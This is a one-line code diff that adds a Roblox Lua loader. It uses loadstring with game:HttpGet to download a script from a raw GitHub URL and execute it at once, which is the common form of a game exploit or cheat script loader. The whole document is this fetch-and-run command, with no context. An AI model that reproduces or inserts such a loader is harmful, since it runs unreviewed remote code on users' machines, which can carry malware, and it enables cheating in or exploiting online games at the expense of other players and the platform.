@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kigredns/sander-X-V4normal/main/normal'))()
